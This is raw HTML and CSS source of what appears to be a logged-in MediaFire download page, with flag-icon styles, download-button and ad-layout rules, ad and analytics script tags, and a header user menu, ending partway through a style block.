flag-fifa-svk{background-image:url(//static.mediafire.com/images/flags_svg/svk.svg)}.flag-svn,.flag-si,.flag-705,.flag-ioc-slo,.flag-fifa-svn{background-image:url(//static.mediafire.com/images/flags_svg/svn.svg)}.flag-swe,.flag-se,.flag-752,.flag-ioc-swe,.flag-fifa-swe{background-image:url(//static.mediafire.com/images/flags_svg/swe.svg)}.flag-swz,.flag-sz,.flag-748,.flag-ioc-swz,.flag-fifa-swz{background-image:url(//static.mediafire.com/images/flags_svg/swz.svg)}.flag-sxm,.flag-sx,.flag-534{background-image:url(//static.mediafire.com/images/flags_svg/sxm.svg)}.flag-syc,.flag-sc,.flag-690,.flag-ioc-sey,.flag-fifa-sey{background-image:url(//static.mediafire.com/images/flags_svg/syc.svg)}.flag-syr,.flag-sy,.flag-760,.flag-ioc-syr,.flag-fifa-syr{background-image:url(//static.mediafire.com/images/flags_svg/syr.svg)}.flag-tca,.flag-tc,.flag-796,.flag-ioc-tks,.flag-fifa-tca{background-image:url(//static.mediafire.com/images/flags_svg/tca.svg)}.flag-tcd,.flag-td,.flag-148,.flag-ioc-cha,.flag-fifa-cha{background-image:url(//static.mediafire.com/images/flags_svg/tcd.svg)}.flag-tgo,.flag-tg,.flag-768,.flag-ioc-tog,.flag-fifa-tog{background-image:url(//static.mediafire.com/images/flags_svg/tgo.svg)}.flag-tha,.flag-th,.flag-764,.flag-ioc-tha,.flag-fifa-tha{background-image:url(//static.mediafire.com/images/flags_svg/tha.svg)}.flag-tjk,.flag-tj,.flag-762,.flag-ioc-tjk,.flag-fifa-tjk{background-image:url(//static.mediafire.com/images/flags_svg/tjk.svg)}.flag-tkl,.flag-tk,.flag-772,.flag-fifa-tkl{background-image:url(//static.mediafire.com/images/flags_svg/tkl.svg)}.flag-tkm,.flag-tm,.flag-795,.flag-ioc-tkm,.flag-fifa-tkm{background-image:url(//static.mediafire.com/images/flags_svg/tkm.svg)}.flag-tls,.flag-tl,.flag-626,.flag-ioc-tls,.flag-fifa-tls{background-image:url(//static.mediafire.com/images/flags_svg/tls.svg)}.flag-ton,.flag-to,.flag-776,.flag-ioc-tga,.flag-fifa-tga{background-image:url(//static.mediafire.com/images/flags_svg/ton.svg)}.flag-tto,.flag-tt,.flag-780,.flag-ioc-tto,.flag-fifa-tri{background-image:url(//static.mediafire.com/images/flags_svg/tto.svg)}.flag-tun,.flag-tn,.flag-788,.flag-ioc-tun,.flag-fifa-tun{background-image:url(//static.mediafire.com/images/flags_svg/tun.svg)}.flag-tur,.flag-tr,.flag-792,.flag-ioc-tur,.flag-fifa-tur{background-image:url(//static.mediafire.com/images/flags_svg/tur.svg)}.flag-tuv,.flag-tv,.flag-798,.flag-ioc-tuv,.flag-fifa-tuv{background-image:url(//static.mediafire.com/images/flags_svg/tuv.svg)}.flag-twn,.flag-tw,.flag-158{background-image:url(//static.mediafire.com/images/flags_svg/twn.svg)}.flag-tza,.flag-tz,.flag-834,.flag-ioc-tan,.flag-fifa-tan{background-image:url(//static.mediafire.com/images/flags_svg/tza.svg)}.flag-uga,.flag-ug,.flag-800,.flag-ioc-uga,.flag-fifa-uga{background-image:url(//static.mediafire.com/images/flags_svg/uga.svg)}.flag-ukr,.flag-ua,.flag-804,.flag-ioc-ukr,.flag-fifa-ukr{background-image:url(//static.mediafire.com/images/flags_svg/ukr.svg)}.flag-umi,.flag-um,.flag-581{background-image:url(//static.mediafire.com/images/flags_svg/umi.svg)}.flag-ury,.flag-uy,.flag-858,.flag-ioc-uru,.flag-fifa-uru{background-image:url(//static.mediafire.com/images/flags_svg/ury.svg)}.flag-usa,.flag-us,.flag-840,.flag-ioc-usa,.flag-fifa-usa{background-image:url(//static.mediafire.com/images/flags_svg/usa.svg)}.flag-uzb,.flag-uz,.flag-860,.flag-ioc-uzb,.flag-fifa-uzb{background-image:url(//static.mediafire.com/images/flags_svg/uzb.svg)}.flag-vat,.flag-va,.flag-336,.flag-fifa-vat{background-image:url(//static.mediafire.com/images/flags_svg/vat.svg)}.flag-vct,.flag-vc,.flag-670,.flag-ioc-vin,.flag-fifa-vin{background-image:url(//static.mediafire.com/images/flags_svg/vct.svg)}.flag-ven,.flag-ve,.flag-862,.flag-ioc-ven,.flag-fifa-ven{background-image:url(//static.mediafire.com/images/flags_svg/ven.svg)}.flag-vgb,.flag-vg,.flag-92,.flag-ioc-ivb,.flag-fifa-vgb{background-image:url(//static.mediafire.com/images/flags_svg/vgb.svg)}.flag-vir,.flag-vi,.flag-850,.flag-ioc-isv,.flag-fifa-vir{background-image:url(//static.mediafire.com/images/flags_svg/vir.svg)}.flag-vnm,.flag-vn,.flag-704,.flag-ioc-vie,.flag-fifa-vie{background-image:url(//static.mediafire.com/images/flags_svg/vnm.svg)}.flag-vut,.flag-vu,.flag-548,.flag-ioc-van,.flag-fifa-van{background-image:url(//static.mediafire.com/images/flags_svg/vut.svg)}.flag-wlf,.flag-wf,.flag-876,.flag-ioc-waf,.flag-fifa-wlf{background-image:url(//static.mediafire.com/images/flags_svg/wlf.svg)}.flag-wsm,.flag-ws,.flag-882,.flag-ioc-sam,.flag-fifa-sam{background-image:url(//static.mediafire.com/images/flags_svg/wsm.svg)}.flag-yem,.flag-ye,.flag-887,.flag-ioc-yem,.flag-fifa-yem{background-image:url(//static.mediafire.com/images/flags_svg/yem.svg)}.flag-zaf,.flag-za,.flag-710,.flag-ioc-rsa,.flag-fifa-rsa{background-image:url(//static.mediafire.com/images/flags_svg/zaf.svg)}.flag-zmb,.flag-zm,.flag-894,.flag-ioc-zam,.flag-fifa-zam{background-image:url(//static.mediafire.com/images/flags_svg/zmb.svg)}.flag-zwe,.flag-zw,.flag-716,.flag-ioc-zim,.flag-fifa-zim{background-image:url(//static.mediafire.com/images/flags_svg/zwe.svg)}.flag-fifa-eng{background-image:url(//static.mediafire.com/images/flags_svg/eng.svg)}.flag-eur,.flag-eu{background-image:url(//static.mediafire.com/images/flags_svg/eur.svg)}.flag-ioc-kos{background-image:url(//static.mediafire.com/images/flags_svg/kos.svg)}.flag-fifa-nir{background-image:url(//static.mediafire.com/images/flags_svg/nir.svg)}.flag-ico-tpe,.flag-fifa-tpe{background-image:url(//static.mediafire.com/images/flags_svg/tpe.svg)}.flag-fifa-sco{background-image:url(//static.mediafire.com/images/flags_svg/sco.svg)}.flag-fifa-wal{background-image:url(//static.mediafire.com/images/flags_svg/wal.svg)}.dl-btn-cont{margin:300px auto 200px;background:#292929;width:604px;padding:20px;overflow:auto;font-size:0;position:relative;box-sizing:border-box;border-radius:6px}.dl-btn-cont>.icon{display:inline-block;width:46px;height:58px;margin-right:15px}.dl-btn-labelWrap{position:absolute;top:25px;left:80px;right:290px}.dl-btn-label{text-overflow:ellipsis;white-space:nowrap;overflow:hidden;color:#fff;font-weight:bold;font-size:12px}.dl-btn-label a{color:#fff}.dl-btn-form{float:right;width:250px}.download_link{line-height:60px;height:60px;box-sizing:border-box;white-space:nowrap;text-align:center}.download_link.retry{height:auto;line-height:normal}.download_link a.input,.download_link input{padding:0;width:100%;height:100%}.download_link a,.download_link input,.download_link button,#authorize_dl_btn{display:block;border-radius:4px;text-decoration:none;color:#fff;background-color:#0070F0;background-color:var(--mf-blue4);font-weight:600;font-size:12px;text-transform:uppercase;border:none;-webkit-appearance:none;outline:none;cursor:pointer}.download_link input:hover,.download_link a:hover,#authorize_dl_btn:hover{text-decoration:none;color:#fff}.download_link span{font-size:12px;font-weight:normal}.download_link a.preparing{padding:11px;line-height:20px}.download_link a.preparing span{line-height:18px}.download_link a.preparing span.js_note{display:block}.download_link.preparing a.input,.download_link.preparing input{display:none}.download_link.started a.input,.download_link.started input{display:none}.download_link .preparing,.download_link .starting,.download_link .retry{display:none}.download_link.preparing .preparing{display:block}.download_link.started .starting{display:block}.download_link.started.retry .starting{display:none}.download_link .retry{border-radius:4px 4px 0 0;line-height:normal;padding:8px 0}.download_link.started.retry .retry{display:block}.download_link .retry em{color:#0045AD;color:var(--mf-blue3);font-style:normal}.download_link .retry:hover em{color:#002369;color:var(--mf-blue2)}.download_link.preparing a,.download_link.started a{color:#282f3d;background:#eee;font-weight:normal;text-transform:none}.download_test_link{display:none;font-size:12px;text-align:center;padding:8px 0;background-color:#eee;border-radius:0 0 4px 4px;box-shadow:inset 0 1px 0 0 #ddd;box-sizing:border-box;line-height:normal;position:relative;z-index:1}.download_link.started.retry+.download_test_link{display:block}.ads-mobileLegacy .download_test_link{margin:0 auto}.promoDownloadName{margin-bottom:8px}#form_captcha .dl-utility-nav{display:none}.dl-utility-nav>ul{margin:0}.dl-utility-nav ul li,.dl-utility-nav li{float:left;width:24px;height:24px;margin-right:10px;position:relative}.dl-utility-nav li a{position:absolute;height:100%;width:100%;left:0;top:0;z-index:1}.dl-utility-nav li:after{margin:0}.dl-utility-nav .tooltip{text-align:center;padding:5px 0}.dl-utility-nav .tooltip.point-up:after,.dl-utility-nav .tooltip.point-right:after,.dl-utility-nav .tooltip.point-down:after,.dl-utility-nav .tooltip.point-left:after{height:5px}.icon{background-position:center;background-repeat:no-repeat}.icon{background-image:url(//static.mediafire.com/images/filetype/file-default-v3.png)}.icon.image{background-image:url(//static.mediafire.com/images/filetype/file-img-v3.png)}.icon.application_x-shockwave-flash{background-image:url(//static.mediafire.com/images/filetype/new/file-swf.png)}.icon.application{background-image:url(//static.mediafire.com/images/filetype/file-app-v3.png)}.icon.archive{background-image:url(//static.mediafire.com/images/filetype/file-zip-v3.png)}.icon.archive.iso{background-image:url(//static.mediafire.com/images/filetype/new/file-iso.png)}.icon.audio{background-image:url(//static.mediafire.com/images/filetype/file-music-v3.png)}.icon.video{background-image:url(//static.mediafire.com/images/filetype/file-video-v3.png)}.icon.document{background-image:url(//static.mediafire.com/images/filetype/file-doc-v3.png)}.icon.document.txt{background-image:url(//static.mediafire.com/images/filetype/new/file-txt.png)}.icon.spreadsheet{background-image:url(//static.mediafire.com/images/filetype/new/file-xls.png)}.icon.presentation{background-image:url(//static.mediafire.com/images/filetype/new/file-ppt.png)}.icon.document.pdf{background-image:url(//static.mediafire.com/images/filetype/new/file-pdf.png)}.icon.other.ait,.icon.ai,.icon.eps,.icon.svg{background-image:url(//static.mediafire.com/images/filetype/new/file-ai.png)}.icon.other.psd,.icon.other.psb,.icon.application.psd,.icon.application.psb{background-image:url(//static.mediafire.com/images/filetype/new/file-psd.png)}.icon.ttf,.icon.otf{background-image:url(//static.mediafire.com/images/filetype/new/file-ttf.png)}.icon.source_code{background-image:url(//static.mediafire.com/images/filetype/new/file-html.png)}.icon.source_code.php{background-image:url(//static.mediafire.com/images/filetype/new/file-php.png)}.icon.source_code.css{background-image:url(//static.mediafire.com/images/filetype/new/file-css.png)}#share-tooltip{width:135px;left:40px}#copy-tooltip{width:154px;left:30px}.mobile .content{overflow:auto;min-width:300px}.ads-mobile1 .nonDLContentWrap{min-height:100px;background:#f4f4f5;position:fixed;top:70px;left:0;right:0;z-index:1;box-shadow:0 1px 0 0 rgba(0,0,0,.1)}.ads-mobile2 .nonDLContentWrap{position:absolute;top:0;left:0;right:0;bottom:0}.ads-mobile3 .nonDLContentWrap{min-height:1680px}.ads-mobileLegacy .nonDLContentWrap,.ads-mobile4 .nonDLContentWrap{position:absolute;top:0;left:0;right:0;bottom:0}.ads-mobile5 .nonDLContentWrap{min-height:0;width:100vw;height:56.25vw;margin:0 auto 50px;max-width:800px;max-height:450px}.ads-mobile5.swapAd .nonDLContentWrap{position:relative;z-index:1}.ads-mobile5.swapAd+#footer{padding-bottom:150px}.ads-mobileLegacy #ads{margin:0 auto;display:block;height:100%;box-sizing:border-box;padding:45px 0 0 0}.ads-mobile1 #ads{margin:10px auto;display:block}.ads-mobile2 #ads{margin:0 auto;display:block;height:100%;box-sizing:border-box;padding:80px 0 0 0}.ads-mobile3 #ads{margin:80px auto 50px;display:block}.ads-mobile4 #ads{margin:0 auto;display:block;height:100%;box-sizing:border-box;padding:80px 0 0 0}.ads-mobile5 #ads{display:block;height:100%;width:100%}.ads-mobile5.swapAd #ads{height:50px;width:320px;margin:10px auto;position:fixed;bottom:0;right:0;left:0}.mobile .dl-promo-cont,.mobile .dl-info,.mobile .DLExtraInfo-Facebook{display:none}.mobile .center{height:282px;width:auto;position:relative;margin-top:330px;top:auto;right:auto;z-index:1}.mobile.turbo-dl .center{height:270px;margin-top:330px}.ads-mobile1 .center{margin-bottom:30px}.ads-mobile2 .center{margin-bottom:30px}.ads-mobile4 .center{margin-bottom:150px}.ads-mobileLegacy .center{height:110px;margin-bottom:160px;margin-top:190px}.ads-mobileLegacy .download_link{line-height:50px!important;height:50px!important;margin:0 auto}.ads-mobileLegacy .download_link.retry{line-height:normal!important;height:auto!important}.ads-mobileLegacy .dl-btn-cont .icon{display:none}.dl-btn-title{font-size:14px;line-height:15px;color:#282f3d!important;overflow:hidden;text-overflow:ellipsis;margin:0;height:20px;white-space:nowrap;font-weight:bold;text-align:center}.ads-mobileLegacy .dl-btn-cont{padding:10px}.mobile .dl-btn-cont{margin:150px auto 0;border-radius:6px;right:0;left:0;width:auto;max-width:450px;min-width:280px;background:#fff}.mobile .ads .dl-btn-cont{margin-top:0}.mobile.ads-mobile3 .DLExtraInfo-wrap{position:absolute;top:380px}.mobile .dl-btn-form{float:none;width:auto}.mobile .download_link{line-height:70px;height:70px}.mobile .download_link.retry{line-height:normal;height:auto}.mobile .download_link a.input,.mobile .download_link input{font-size:12px;text-transform:none;font-weight:300;text-align:left;text-indent:60px;line-height:98px;background-image:url(//static.mediafire.com/images/icons/svg_light/download.svg);background-repeat:no-repeat;background-position:right 30px center}.mobile.turbo-dl .download_link a.input,.mobile.turbo-dl .download_link input{border-radius:4px 4px 0 0}.ads-mobileLegacy .download_link a.input,.ads-mobileLegacy .download_link input{font-size:12px;font-weight:bold;line-height:50px;text-align:center;text-indent:0;background-image:none;text-transform:uppercase}.mobile .dl-btn-cont>.icon{position:absolute;z-index:1;top:26px;left:26px;pointer-events:none;background-size:32px}.mobile .dl-btn-labelWrap{position:absolute;top:32px;right:20px;left:80px;z-index:1;pointer-events:none}.mobile .dl-btn-label{font-weight:600;font-size:16px;margin-right:70px}.mobile .dl-utility-nav{display:none}.mobile .download_link.preparing .preparing,.mobile .download_link.started .starting,.mobile .download_link.started.retry .retry{position:relative;z-index:1}.DLMobile-shareOptions{display:none;text-align:center;max-width:450px;padding-top:15px}.mobile .DLMobile-shareOptions{display:block}.DLMobile-shareOptions>ul{display:flex;flex-wrap:wrap;box-sizing:border-box;margin:0 -5px}.DLMobile-shareOptions li{flex-basis:50%}.DLMobile-shareOptions a{display:block;font-size:11px;line-height:14px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;background-color:#f4f4f5;border-radius:4px;color:#575B65;color:var(--mf-gray4);padding:5px 0 10px;margin:5px}.turbo-dl .DLMobile-shareOptions a{margin:0 5px}.DLMobile-shareOptions a span{display:block;height:26px;margin:0 auto;opacity:.5}.DLMobile-shareOptions p{font-size:11px;text-align:center;color:var(--mf-gray5);padding:5px 0 15px;line-height:normal}.turbo-dl .DLMobile-shareOptions p{padding:0px 0 15px}.turbo-dl .dl-btn-cont{margin-bottom:0;border-radius:6px 6px 0 0}.ads-enabled .TurboDL-toggle-box{width:100%}.mftd-root{width:604px;margin:auto}main:not(.ads-enabled) .mftd-root{margin:300px auto 0}#copyShareURLMobile span{background:#f4f4f5 url(//static.mediafire.com/images/icons/svg_dark/link.svg) center / 28px no-repeat}#facebookShareButtonMobile span{background:#f4f4f5 url(//static.mediafire.com/images/icons/svg_dark/facebook.svg) center / 24px no-repeat}#shareButtonMobile span{background:#f4f4f5 url(//static.mediafire.com/images/icons/svg_dark/share.svg) center / 24px no-repeat}#saveButtonMobile span{background:#f4f4f5 url(//static.mediafire.com/images/icons/svg_dark/add.svg) center / 24px no-repeat}.mobile .passwordPrompt{background:#fff;position:relative;z-index:1}.mobile .download_link input.passwordInput{text-indent:0;line-height:40px;width:auto;max-width:200px;background:#f4f4f5}.mobile .passwordPrompt input[type="submit"]{line-height:40px;text-indent:0;text-align:center;background-image:none;font-size:11px;font-weight:600;text-transform:uppercase}.TurboDL-toggle-box{display:flex;justify-content:flex-end;width:604px;padding:0 20px;position:relative;box-sizing:border-box;background-color:#292929;border-top:1px solid #424242;margin:auto}.mobile .TurboDL-toggle-box{padding:0;border-radius:0 0 4px 4px;width:100%}main:not(.ads-enabled):not(.mobile) .TurboDL-toggle-box{border-radius:0 0 6px 6px}.TurboDL-button{display:flex;align-items:center;width:250px;padding:8px 0;background-color:transparent;border:none;border-radius:4px;color:#fff;font-size:11px;-webkit-appearance:none;cursor:pointer}.mobile .TurboDL-button{width:100%;padding:12px 0;justify-content:center}.turboTDL-toggle{display:flex;align-items:center;width:28px;padding:1px;margin-right:10px;border-radius:999em}.TurboDL-toggle-box.toggle-on .turboTDL-toggle{justify-content:flex-end;background-color:#0070f0;border:1px solid #0070f0}.TurboDL-toggle-box.toggle-off .turboTDL-toggle{justify-content:flex-start;border:1px solid #71757F}.turboTDL-toggle-slider{width:12px;height:12px;border-radius:999em}.TurboDL-toggle-box.toggle-on .turboTDL-toggle-slider{background-color:#fff}.TurboDL-toggle-box.toggle-off .turboTDL-toggle-slider{background-color:#71757F}.turboTDL-toggle-note{margin-left:auto;display:flex;padding:3px;border-radius:2px;background-color:#0070f0;font-size:9px;text-transform:uppercase}.mobile .turboTDL-toggle-note{margin-left:10px}.TurboDL-message{display:none;box-sizing:border-box;padding:11px 12px;border-radius:4px;background-color:#fff;color:#222835;font-size:12px;position:absolute;right:20px;bottom:100%;z-index:1;left:20px;margin-bottom:8px}.TurboDL-button:hover+.TurboDL-message{display:block}.TurboDL-message::after{content:'';position:absolute;top:100%;right:120px;border-style:solid;border-color:#fff transparent transparent;border-width:6px}    </style>
    <script type="text/javascript">
      window.displayAds = "true" === "true";
    </script>
        <script src="https://the.gatekeeperconsent.com/cmp.min.js" data-cfasync="false"></script>    <script>
    window.ezstandalone = window.ezstandalone || {};
    ezstandalone.cmd = ezstandalone.cmd || [];
    ezstandalone.cmd.push(function() {
        ezstandalone.enableConsent();

        var percentageToRunEzoic = 80;
        window.bEzoicSelected = ezstandalone.isEzoicUser(percentageToRunEzoic);
        if (window.bEzoicSelected) {
            ezstandalone.define(108,110);
            ezstandalone.enable();
            ezstandalone.display();
        }
    });
</script>
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-829541-1"></script><script src="https://btloader.com/tag?o=5678961798414336&upapi=true" async></script><script async src="//www.ezojs.com/ezoic/sa.min.js"></script><script async src="//static.mediafire.com/js/upgrade_widget.js"></script>    <!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-53LP4T');</script>
<!-- End Google Tag Manager -->    <!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-53LP4T"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) --></head>
<body class="en defaultTheme">
        
<main role="main" class="mf-dlr page ads-mobile4 sticky-mode mobile ads-enabled">
    <label for="copy" style="display: none;">Copy textarea</label>
    <textarea id="copy" style="position:absolute;left:-9999px;opacity:0" aria-hidden="true" tabindex="-1">https://www.mediafire.com/file/gpikhj7qgu0pyoz/${vn}.mp4/file</textarea>
    <div class="content">
        <style type="text/css">
.header {
    height: 70px;
    background: #fff;
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    z-index: 9999999;
    box-shadow: 0 1px 0 0 rgba(0, 0, 0, .1);
}

.logo {
    float: left;
    margin: 0;
}

.logo > a {
    display: table;
    height: 70px;
    width: 191px;
    background: url(//static.mediafire.com/images/backgrounds/header/mf_logo_full_color.svg) 0 center/180px auto no-repeat;
    margin: 0 auto;
    text-indent: -9999px;
}

.user-menu {
    float: right;
    margin: 17px 0px 0 0;
    font-family: "open sans";
    font-size: 12px;
}

.user-menu > li {
    float: right;
    margin-right: 10px;
}

.user-menu > li:first-child {
    margin: 0;
}

.user-menu-help, .user-menu-myfiles {
    max-width: 150px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
}

.mobile .user-menu-help {
    display: none;
}

#loggedin {
    margin-right: 0;
    padding: 0 2px 0 19px;
}

#loggedin span.smArrowDown {
    background: url(//static.mediafire.com/images/icons/svg_dark/icons_sprite.svg) no-repeat -510px -5px;
    display: block;
    width: 13px;
    height: 12px;
    opacity: .5;
    position: absolute;
    left: 4px;
    top: 12px;
}

.searchWrap .dropdown a span {
    background: url(//static.mediafire.com/images/backgrounds/newMyfiles/smArrow.png) no-repeat -12px top;
    display: block;
    width: 12px;
    height: 12px;
    opacity: .4;
    position: absolute;
    left: 5px;
    top: 12px;
}

.searchWrap .dropdown a:hover span {
    opacity: .6;
}

#loggedin.prelogin {
    display: none;
}

#loggedin a:hover {
    text-decoration: none;
}

#loggedin .arrow_tab {
    float: left;
    position: relative;
    height: 32px;
    width: 32px;
    background: #bbb;
    margin-top: 2px;
}

#loggedin .arrow_tab img {
    height: 32px;
    width: 32px;
}

#loggedin .arrow_tab .notificationBubble {
    margin-top: -26px;
    margin-left: -26px;
}

#loggedin_email {
    max-width: 150px;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
}

#loggedin_dropdown {
    margin-right: 0;
    overflow: hidden;
    top: 36px;
}

#loggedin_dropdown li:first-child {
    font-weight: bold;
    color: #000;
    font-style: normal;
}

.dropdown.show_dropdown #loggedin {
    background: #fff !important;
    color: #9e9d9d !important;
    text-shadow: none !important;
    -webkit-box-shadow: 1px 0px 0px 0px rgba(0, 0, 0, .15), -1px -1px 0px 0px rgba(0, 0, 0, .15) !important;
    -moz-box-shadow: 1px 0px 0px 0px rgba(0, 0, 0, .15), -1px -1px 0px 0px rgba(0, 0, 0, .15) !important;
    box-shadow: 1px 0px 0px 0px rgba(0, 0, 0, .15), -1px -1px 0px 0px rgba(0, 0, 0, .15) !important;
    z-index: 1000;
    border-bottom-left-radius: 0;
    border-bottom-right-radius: 0;
    position: relative;
}

/* Media queries for Full, Authenticated header
========================================================================== */

@media (max-width: 960px) {
    .logo {
        margin-left: 20px;
    }

    .user-menu {
        margin-right: 17px;
    }
}

@media (max-width: 850px) {
    .user-menu-help,
    .user-menu-myfiles {
        max-width: 120px;
    }
}

@media (max-width: 790px) {
    .user-menu-help,
    .user-menu-myfiles {
        font-size: 0;
        width: auto;
    }

    .user-menu-help .g-Icon,
    .user-menu-myfiles .g-Icon {
        margin: 0;
    }
}

@media (max-width: 660px) {
    #goog-header-translate {
        width: 60px;
    }

    #goog-header-translate .goog-te-combo {
        text-indent: 60px;
        padding: 0;
    }
}

@media (max-width: 560px) {
    .logo {
        width: 48px;
        overflow: hidden;
    }
}

@media (max-width: 540px) {
    .user-menu-help {
        display: none;
    }
}

@media (max-width: 480px) {
    .user-menu-myfiles {
        display: none;
    }
}

@media (max-width: 410px) {
    .customLogo .logo,
    .customLogo .logo > a {
        width: 150px;
    }
}

@media (max-width: 370px) {
    .customLogo .logo,
    .customLogo .logo > a {
        width: 110px;
    }
}

@media (max-width: 340px) {
    .customLogo .logo,
    .customLogo .logo > a {
        width: 90px;
    }
}
</style>
<div class="header">
    <div class="u-wrap">
        <h1 class="logo">
            <a href="/">MediaFire</a>
        </h1>
        <ul class="user-menu">
            <li>
                <div class="dropdown ddRight">
                    <a href="#"
                        id="loggedin"
                        class="g-Btn g-Btn--secondary postlogin"
                        title="Logged in as ZanCokDev@gmail.com">
                        <span class="smArrowDown"></span>
                        <span id="avatar-icon" class="arrow_tab">
                            <span>
                                <img src="https://www.mediafire.com/images/icons/myfiles/default.png" style="width: 32px; height: 32px" alt="User Avatar" />
                            </span>
                        </span>
                    </a>
                    <ul id="loggedin_dropdown">
                        <li class="ddStaticTxt">Asep Asel</li> 
<li class="ddStaticTxt"><div>ZanCokDev@gmail.com</div></li>
<li class="ddStaticTxt">Free</li>



    <li>
        <a href="/myaccount" style="color: #ef5939;">
            <span class="notificationBubble">!</span>Verify Email
        </a>
    </li>

<li class="divider"></li>
<li><a href="/" class="notranslate"><span class="g-Icon g-Icon--folder"></span>My Files</a></li>
<li><a href="/myaccount"><span class="g-Icon g-Icon--settings"></span>Settings</a></li>
<li><a href="/upgrade/"><span class="g-Icon g-Icon--upgrade"></span>Upgrade</a></li>
<li><a href="/earnspace/"><span class="g-Icon g-Icon--add"></span>Earn free space!</a></li>
<li><a href="/software/"><span class="g-Icon g-Icon--mobile"></span>Mobile</a></li>
<li><a href="/dynamic/logout.php?use_doc_domain=1"
    target="iframe_worker"
    id="logout"
    style="margin-bottom:5px;">
    <span class="g-Icon g-Icon--logout"></span>Log Out</a>
</li>                    </ul>
                </div>
            </li>
            <li>
                <a href="/help" class="user-menu-help g-Btn g-Btn--secondary">
                    <span class="g-Icon g-Icon--help"></span>Help
                </a>
            </li>
            <li>
                <a href="/" class="user-menu-myfiles g-Btn g-Btn--secondary notranslate">
                    <span class="g-Icon g-Icon--folder"></span>My Files
                </a>
            </li>
            <li class="header-gt-cont">
                <noscript><style>.header-gt-cont { display: none; }</style></noscript>
                <span class="gt-label">Language:</span>
                <div id="goog-header-translate" class="g-Btn g-Btn--secondary"></div>
                <script type="text/javascript">
                  try {
                    function googHeadTranslate() {
                        new google.translate.TranslateElement({
                            pageLanguage: 'en',
                            layout: google.translate.TranslateElement.InlineLayout.VERTICAL,
                            gaTrack: true,
                            gaId: 'UA-829541-1'
                        }, 'goog-header-translate');
                        registerGoogleLang();
                    }
                  } catch(e) {}
                </script>
                <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googHeadTranslate" async defer></script>
            </li>
        </ul>
    </div>
</div>
                    
<div class="center">
            <div id="abdd" class="ad_unit"></div>
<div class="upsell-ab-promo" style="display: none">
    <style type="text/css" media="not all">
        /* Adjust default page elements */
        .DLExtraInfo-wrap {
            display: none;
        }
        .nonDLContentWrap,
        .sticky-mode .nonDLContentWrap,
        .ads-normal .content,
        .ads-alternate .content {
            min-height: 0 !important;
        }
        .center {
            position: static;
            background-color: transparent !important;
        }
        body {
            display: flex;
            flex-direction: column;
            background-color: #04010D;
            background-image: radial-gradient(circle at center, #000ECC 30%, #170088 80%, #19004A 110%);
            background-repeat: no-repeat;
            background-attachment: fixed;
        }
        body::before {
            content: '';
            background-image: url(//static.mediafire.com/images/download/upsell/folders.svg);
            background-position: center top;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            opacity: .25;
            pointer-events: none;
        }
        main.page {
            min-height: 0;
            flex-grow: 1;
            padding-bottom: 0;
            padding-top: 0;
            box-sizing: border-box;
            background-color: transparent;
            display: flex;
        }
        #non-dl-content {
            display: none;
        }
        .content {
            max-width: none;
            background-color: transparent;
            display: flex;
            flex-direction: column;
            flex-grow: 1;
        }
        .sticky-mode .content {
            min-height: 0;
        }
        #footer {
            position: relative;
        }
        #footer {
            min-height: 0;
        }
        #mainFooterWrap {
            display: none;
        }
        .sticky-mode ~ #footer > #subFooterWrap {
            padding-bottom: 0;
        }
        .center {
            display: flex;
            width: auto;
            flex-grow: 1;
            align-items: center;
            padding: 0 30px;
            gap: 30px;
            height: auto;
            overflow: auto;
            border-radius: 0;
            flex-shrink: 0;
            box-sizing: border-box;
            margin: auto;
        }
        .mobile .center {
            margin: 0;
            height: auto;
        }
        .dl-box {
            display: flex;
            flex-direction: column;
            max-width: 450px;
            flex-shrink: 0;
        }
        .dl-info {
            display: none;
        }
        main:not(.mobile) .ads .dl-btn-cont {
            width: auto;
            display: flex;
            flex-wrap: wrap;
            gap: 20px 0;
        }
        .mobile .ads .dl-btn-cont {
            min-width: 450px;
            max-width: none;
        }
        .mobile .DLMobile-shareOptions {
            max-width: none;
        }
        .dl-btn-cont > .icon {
            flex-shrink: 0;
        }
        .dl-btn-labelWrap {
            position: static;
            flex-grow: 1;
            min-width: 0;
        }
        .dl-btn-form {
            float: none;
            width: 100%;
        }
        #downloadButton:hover {
            background-color: #0045AD;
        }
        .TurboDL-button {
            width: 100%;
        }
        .mftd-root {
            width: auto;
        }
        .mftd-box {
            max-width: none !important;
            min-width: 0 !important;
            display: flex !important;
            flex-direction: column !important;
        }
        .mftd-file {
            width: auto !important;
        }
        .mftd-main {
            float: none !important;
            width: auto !important;
            margin-left: 16px !important;
        }
        .mobile.turbo-dl .center {
            height: auto;
            margin-top: 0;
        }
        .mobile.turbo-dl .dl-btn-cont {
            border-radius: 6px;
        }

        .header > .logo > a {
            background: url(//static.mediafire.com/images/backgrounds/header/mf_logo_u1_full_color_reversed.svg) 0 center / 180px auto no-repeat;
        }

        @media (max-width: 550px) {
            .mobile.turbo-dl .dl-btn-cont {
                border-radius: 0;
            }
        }
        @media (max-height: 770px) {
        }
        @media (max-width: 1600px) {
        }
        @media (max-width: 1450px) {
        }
        @media (max-width: 1050px) {
            body {
                background-image: radial-gradient(circle at center 35%, #1302AC 15%, #0E004A 65%, #0B0023 100%);
            }
        }
        @media (max-width: 570px) {
            #loggedin_dropdown {
                right: 0;
                left: auto;
            }
        }
        @media (max-width: 550px) {
            .center {
                padding: 0;
            }
            .dl-box {
                max-width: none;
                width: 100%;
                margin-bottom: 0;
            }
            .ads .dl-btn-cont {
                border-radius: 0;
            }
            .MFDiscountOffer {
                padding-bottom: 20px;
            }
            .header > .actions > li {
                width: auto;
            }
            .header > .actions > li > a {
                width: auto;
                position: static;
                padding: 0 8px
            }
